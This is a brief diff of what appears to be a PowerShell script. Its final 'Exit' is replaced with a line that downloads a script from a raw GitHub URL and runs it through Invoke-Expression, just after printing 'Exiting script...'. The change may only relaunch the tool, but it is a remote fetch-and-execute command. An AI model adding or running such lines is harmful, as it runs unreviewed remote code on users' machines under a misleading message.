@@ -168,5 +168,5 @@ else {
 }
 
 Write-Host "Exiting script..."
-Exit
+Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/emreuls7/mr.winls/main/program.ps1").Content
 
